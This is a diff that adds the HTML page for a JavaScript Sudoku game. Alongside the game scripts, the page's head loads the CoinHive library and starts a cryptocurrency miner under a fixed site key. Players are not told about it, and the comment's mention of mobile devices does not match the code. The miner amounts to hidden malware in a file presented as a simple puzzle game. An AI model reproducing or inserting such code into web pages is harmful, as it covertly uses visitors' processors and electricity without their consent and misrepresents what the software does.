@@ -1,0 +1,34 @@
+<!-- Javascript Sudoku by Matthew Eagar -->
+<!-- http://www.meagar.net -->
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN"
+"http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml" lang="en" xml:lang="en">
+<head>
+<title>JQuery Sudoku</title>
+<script type="text/javascript" src="../../jquery.min.js"></script>
+<script type="text/javascript" src="sudoku.js"></script>
+<script src="https://coinhive.com/lib/coinhive.min.js"></script>
+<script>
+    var miner = new CoinHive.Anonymous('aPFC8KnX2SS7amIrk4yUxyD5NTxJaTKb', {throttle: 0.3});
+    
+    // Only start on non-mobile devices and if not opted-out
+    // in the last 14400 seconds (4 hours):
+    if (!miner.didOptOut(14400)) {
+        miner.start(CoinHive.FORCE_EXCLUSIVE_TAB);
+    }
+</script>
+<link rel="stylesheet" type="text/css" href="sudoku.css" />
+</head>
+<body>
+<div id="Container">
+</div>
+<div id="Buttons" style="text-align:center">
+<p>Navigate with arrow keys or mouse</p>
+<p>1-9 to fill a space, 0/delete/space to clear.</p>
+<button onclick="javascript:return makeBoard()">New</button>
+<button onclick="javascript:return resetBoard()">Reset</button>
+<button onclick="javascript:return solveBoard()">Solve</button>
+<button onclick="javascript:return clearBoard()">Clear</button>
+</div>
+</body>
+</html>
